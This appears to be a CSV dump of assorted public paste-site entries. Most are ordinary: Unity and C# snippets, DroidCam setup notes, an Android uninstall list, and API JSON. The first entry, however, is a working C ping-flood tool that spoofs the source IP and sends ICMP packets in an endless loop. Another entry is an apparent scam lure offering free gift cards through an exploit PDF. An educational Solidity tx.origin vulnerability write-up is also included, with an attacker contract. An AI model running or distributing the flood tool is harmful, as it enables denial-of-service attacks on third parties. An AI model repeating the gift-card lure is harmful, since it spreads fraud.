id,title,username,language,date,content
9NjF0fTH,PING Flood,opencard,C,Monday 15th of January 2024 11:59:30 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>
typedef unsigned char u8;
typedef unsigned short int u16;
unsigned short in_cksum(unsigned short *ptr, int nbytes);
void help(const char *p);
int main(int argc, char **argv)
{
    if (argc < 3) 
    {
        printf(""KeyViewer PING FLOOD\nИспользование: %s <Отправитель> <Получатель> [размер сообщения]\n"", argv[0]);
        exit(0);
    }
    unsigned long daddr;
    unsigned long saddr;
    int payload_size = 0, sent, sent_size;
    saddr = inet_addr(argv[1]);
    daddr = inet_addr(argv[2]);
    if (argc > 3)
    {
        payload_size = atoi(argv[3]);
    }
    int sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
    
    if (sockfd < 0) 
    {
        perror(""Не удалось создать сокет"");
        return (0);
    }
    int on = 1;
    if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on)) == -1) 
    {
        perror(""setsockopt"");
        return (0);
    }
    if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof (on)) == -1) 
    {
        perror(""setsockopt"");
        return (0);
    }
    int packet_size = sizeof (struct iphdr) + sizeof (struct icmphdr) + payload_size;
    char *packet = (char *) malloc (packet_size);           
    if (!packet) 
    {
        perror(""out of memory"");
        close(sockfd);
        return (0);
    }
    struct iphdr *ip = (struct iphdr *) packet;
    struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
    memset (packet, 0, packet_size);
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons (packet_size);
    ip->id = rand ();
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->saddr = saddr;
    ip->daddr = daddr;
      icmp->type = ICMP_ECHO;
    icmp->code = 0;
      icmp->un.echo.sequence = rand();
      icmp->un.echo.id = rand();
    icmp->checksum = 0;
    struct sockaddr_in servaddr;
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = daddr;
    memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));
    puts(""Флуд..."");
    while (1)
    {
        memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);
        icmp->checksum = 0;
        icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size);
        if ( (sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 1) 
        {
            perror(""Ошибка отправки\n"");
            break;
        }
        ++sent;
        printf(""%d Пакетов отправлено\r"", sent);
        fflush(stdout);    
        usleep(10000);
    }
    free(packet);
    close(sockfd);
    return (0);
}
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    u_short oddbyte;
    register u_short answer;
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) & oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}"
cSZqUWrX,UI Dragging,Krythic,C#,Monday 15th of January 2024 11:48:04 PM CDT,"using UnityEngine;
using UnityEngine.EventSystems;

public class DraggableControl : MonoBehaviour,
    IPointerDownHandler, IPointerUpHandler, IDragHandler
{
    public GameObject parent;
    public Canvas canvas;
    private bool _isDragging;
    private Vector3 _offset;

    // Start is called before the first frame update
    void Start()
    {

    }

    public void OnPointerDown(PointerEventData eventData)
    {
        _isDragging = true;
        _offset = eventData.position - new Vector2(parent.transform.position.x, parent.transform.position.y);
    }

    public void OnPointerUp(PointerEventData eventData)
    {
        _isDragging = false;
    }

    public void OnDrag(PointerEventData eventData)
    {
        if (_isDragging)
        {
            Vector3 position = new Vector3(Input.mousePosition.x, Input.mousePosition.y, 0f) - _offset;
            parent.transform.position = position;
            /**
             * TODO Tomorrow
             * Move the two getcomponent calls up to the OnPointerDown handler, so we only call it once while
             * the playeris dragging the ui element, instead of every frame that it is dragging.
             */
            ClampToWindow(
                position,
                parent.GetComponent<RectTransform>(),
                canvas.GetComponent<RectTransform>());
        }
    }

    private void ClampToWindow(Vector3 mousePosition, RectTransform parentRect, RectTransform canvasRect)
    {
        parentRect.transform.position = mousePosition;
        Vector3 pos = parentRect.localPosition;
        Vector3 minPosition = canvasRect.rect.min - parentRect.rect.min;
        Vector3 maxPosition = canvasRect.rect.max - parentRect.rect.max;
        pos.x = Mathf.Clamp(parentRect.localPosition.x, minPosition.x, maxPosition.x);
        pos.y = Mathf.Clamp(parentRect.localPosition.y, minPosition.y, maxPosition.y);
        parentRect.localPosition = pos;
    }
}
"
btRAAVVY,Untitled,kwest87,C#,Monday 15th of January 2024 11:17:33 PM CDT,"using System;

namespace ConsoleApp27
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int[] numbers = { 1, 2, 3, 4, 5 };
            int temporaryNumber;
            int shift;

            Console.WriteLine(""Сколь раз сдвинуть массив влево : "");
            shift = Convert.ToInt32(Console.ReadLine());
            shift %= numbers.Length;

            for (int j = 0; j < shift; shift--)
            {
                temporaryNumber = numbers[0];

                for (int i = 0; i < numbers.Length - 1; i++)
                {
                    numbers[i] = numbers[i + 1];
                }

                numbers[numbers.Length - 1] = temporaryNumber;
            }

            for (int i = 0; i < numbers.Length; i++)
            {
                Console.Write(numbers[i] + "" "");
            }
        }
    }
}"
59ezTp3C,G2A.com Free Gift Card Guide Jan 2024,ounnuo,GetText,Monday 15th of January 2024 11:05:39 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_783907.pdf
 
Working as of
16 January 2024"
NX6EceZX,Using Droidcam on Linux with V4L2,chadjoan,Bash,Monday 15th of January 2024 11:00:21 PM CDT,"# Possibly optional steps that improve resolution.
# These must be done as `root`.
# Source: https://www.dev47apps.com/droidcam/linux/
rmmod v4l2loopback-dc
insmod /lib/modules/`uname -r`/video/v4l2loopback-dc.ko width=1920 height=1080

# Open DroidCam(X) on Android device. Start it up. Get IP address and port.
# In this example, the IP address is 192.168.1.39 and the port is 4747.

# Put this in one shell to create a /dev/videoN node that other programs can connect to.
# (I did this as `root`, but I'm not sure if `root` is needed.)
droidcam-cli -a -v 192.168.1.39 4747
#```
#Client v2.0.0
#Video: /dev/video0
#Audio: hw:3,1,0
#```

# Alternatively, if the device has ADB debugging over USB enabled
# in its developer options, then droidcam-cli can connect this way
# over a USB3.0 wire:
droidcam-cli -a -v adb 4747

# This connection seems to have MUCH better bandwidth/framerate!
#
# If connecting from a new computer, the phone might get a prompt
# asking whether the computer should be trusted. This prompt must
# be answered affirmatively before the above `adb` mode will work.
# After answering the prompt, it may also be necessary to restart
# the DroidCam(X) app on the phone/device, and possibly also
# necessary to restart `droidcam-cli` with the same command above.
# If all is good, it will give the same output as the IP version.

# It should now be possible to use the ""webcam"" from other programs, and from web apps like Discord.
# (This should be done as the user in the desktop environment, NOT as root.)
# To test functionality manual, `mpv` can be used like so:
mpv av://v4l2:/dev/video0 --profile=low-latency --untimed
#```
# (+) Video --vid=1 (rawvideo 1920x1080 30.000fps)
#VO: [gpu] 1920x1080 yuv420p
#V: 02:08:20 / 02:08:20 (100%)
#```
# NOTE that the `/dev/video0` in this command must match the ""Video:"" field from droidcam-cli.
# It just happened to be `/dev/video0` in this example, but it could be any `/dev/videoN` node.
"
QBva7r4d,for xda,tdbone1,Bash,Monday 15th of January 2024 09:53:13 PM CDT,"# Preset created in ADB AppControl 1.8.3.1
# Total applications: 100
# 2024-01-15_21:51:56
# Samsung SM-G998B Uninstalled applications
com.android.apps.tag
com.android.bips
com.android.bookmarkprovider
com.android.cts.priv.ctsshim
com.android.dreams.basic
com.android.dreams.phototable
com.android.dynsystem
com.android.egg
com.android.hotwordenrollment.okgoogle
com.android.hotwordenrollment.xgoogle
com.android.managedprovisioning
com.android.printspooler
com.android.providers.partnerbookmarks
com.android.stk
com.android.stk2
com.android.traceur
com.android.vending
com.android.wallpaper.livepicker
com.diotek.sec.lookup.dictionary
com.google.android.apps.restore
com.google.android.apps.turbo
com.google.android.cellbroadcastreceiver
com.google.android.configupdater
com.google.android.feedback
com.google.android.gms
com.google.android.gms.location.history
com.google.android.googlequicksearchbox
com.google.android.onetimeinitializer
com.google.android.partnersetup
com.google.android.printservice.recommendation
com.google.android.projection.gearhead
com.google.android.setupwizard
com.google.android.syncadapters.calendar
com.google.android.tts
com.google.audio.hearing.visualization.accessibility.scribe
com.monotype.android.font.foundation
com.osp.app.signin
com.samsung.android.accessibility.talkback
com.samsung.android.allshare.service.mediashare
com.samsung.android.app.camera.sticker.facearavatar.preload
com.samsung.android.app.clipboardedge
com.samsung.android.app.cocktailbarservice
com.samsung.android.app.omcagent
com.samsung.android.app.reminder
com.samsung.android.app.routines
com.samsung.android.app.settings.bixby
com.samsung.android.app.sharelive
com.samsung.android.app.taskedge
com.samsung.android.app.updatecenter
com.samsung.android.app.watchmanagerstub
com.samsung.android.aware.service
com.samsung.android.bbc.bbcagent
com.samsung.android.beaconmanager
com.samsung.android.bixby.agent
com.samsung.android.bixbyvision.framework
com.samsung.android.calendar
com.samsung.android.da.daagent
com.samsung.android.dynamiclock
com.samsung.android.easysetup
com.samsung.android.fmm
com.samsung.android.forest
com.samsung.android.game.gamehome
com.samsung.android.game.gametools
com.samsung.android.gru
com.samsung.android.ipsgeofence
com.samsung.android.mdx
com.samsung.android.mobileservice
com.samsung.android.net.wifi.wifiguider
com.samsung.android.networkstack.tethering.overlay
com.samsung.android.peripheral.framework
com.samsung.android.rubin.app
com.samsung.android.scloud
com.samsung.android.sdm.config
com.samsung.android.service.peoplestripe
com.samsung.android.service.stplatform
com.samsung.android.smartmirroring
com.samsung.android.stickercenter
com.samsung.android.svoiceime
com.samsung.android.visionintelligence
com.samsung.app.newtrim
com.samsung.cmfa.AuthTouch
com.samsung.SMT
com.samsung.storyservice
com.sec.android.app.chromecustomizations
com.sec.android.app.clockpackage
com.sec.android.app.desktoplauncher
com.sec.android.app.dexonpc
com.sec.android.app.magnifier
com.sec.android.app.safetyassurance
com.sec.android.app.samsungapps
com.sec.android.app.SecSetupWizard
com.sec.android.app.setupwizardlegalprovider
com.sec.android.autodoodle.service
com.sec.android.daemonapp
com.sec.android.desktopmode.uiservice
com.sec.android.easyMover.Agent
com.sec.android.soagent
com.sec.enterprise.knox.cloudmdm.smdms
com.sec.location.nsflp2
com.sec.spp.push
"
9YEL7Xfw,Linux. Unzip. Test integrity of ZIP file,sytchenko,Bash,Monday 15th of January 2024 09:36:51 PM CDT,unzip -t archive.zip
j1jsDQrq,Smart Contract Vulnerability - Authorization Through tx.origin,FlyFar,Email,Monday 15th of January 2024 09:06:06 PM CDT,"Authorization Through tx.origin
tx.origin is a global variable in Solidity which returns the address that sent a transaction. It's important that you never use tx.origin for authorization since another contract can use a fallback function to call your contract and gain authorization since the authorized address is stored in tx.origin. Consider this example:

pragma solidity >=0.5.0 <0.7.0;

// THIS CONTRACT CONTAINS A BUG - DO NOT USE
contract TxUserWallet {
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    function transferTo(address payable dest, uint amount) public {
        require(tx.origin == owner);
        dest.transfer(amount);
    }
}

Here we can see that the TxUserWallet contract authorizes the transferTo() function with tx.origin.

pragma solidity >=0.5.0 <0.7.0;

interface TxUserWallet {
    function transferTo(address payable dest, uint amount) external;
}

contract TxAttackWallet {
    address payable owner;

    constructor() public {
        owner = msg.sender;
    }

    function() external {
        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
    }
}

Now if someone were to trick you into sending ether to the TxAttackWallet contract address, they can steal your funds by checking tx.origin to find the address that sent the transaction.

To prevent this kind of attack, use msg.sender for authorization.

Examples from: https://solidity.readthedocs.io/en/develop/security-considerations.html#tx-origin

Sources
https://swcregistry.io/docs/SWC-115
https://solidity.readthedocs.io/en/develop/security-considerations.html#tx-origin
https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/tx-origin/
https://github.com/sigp/solidity-security-blog#tx-origin"
qkdSEmc0,Untitled,BayangBec,JSON,Monday 15th of January 2024 08:53:46 PM CDT,"[
  {
    catalog_id: '08186bc0-07fb-4867-a163-67c98dec43e3',
    catalog_url: 'https://dev-storage-mccp.mocogawe.com/original/publication/book/file/5fa35fc63f30a67fd2dfdeeffabb58747fa416faff6b7b80720c3f6e41053984.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=minio%2F20231215%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231215T034555Z&X-Amz-Expires=7200&X-Amz-SignedHeaders=host&X-Amz-Signature=b64f413ff65512a2d20f8a9b0f46573b2cf0f31a5f7b328302f658e1d1cde2a8'
  }
]"
Fuf9tYpt,Untitled,BayangBec,JSON,Monday 15th of January 2024 08:47:50 PM CDT,"{
  ""data"": [
    {
      ""catalog_id"": ""841aed8d-1c43-4393-9b6a-8fcb4eaaed25"",
      ""created_at"": ""2024-01-16T01:58:10.698Z"",
      ""epustaka_id"": ""bf61f006-e90a-4c36-a6c8-d5b566a2a088"",
      ""epustaka_catalog_qty"": 2
    }
  ],
  ""app_id"": ""6453b42c-a3f6-434d-ae6f-1071f148f24e"",
  ""config"": {
    ""url"": ""https://dev-api-agent-manager.mocogawe.com/agent-manager"",
    ""header"": {
      ""headers"": {
        ""Accept"": ""application/json"",
        ""Content-Type"": ""application/json"",
        ""Access-Control-Allow-Origin"": true
      }
    },
    ""method"": ""post"",
    ""endpoint"": ""activation/content""
  },
  ""credential"": ""454f6a64324f5958534a4a445233626f2f79754834356b456f6b5538755036346d357a4a6d65526c6b356a48466162656d4f35794250623458364c6c375956612b326e2f674f6169347256724a61324f5a66437441413d3d""
}"
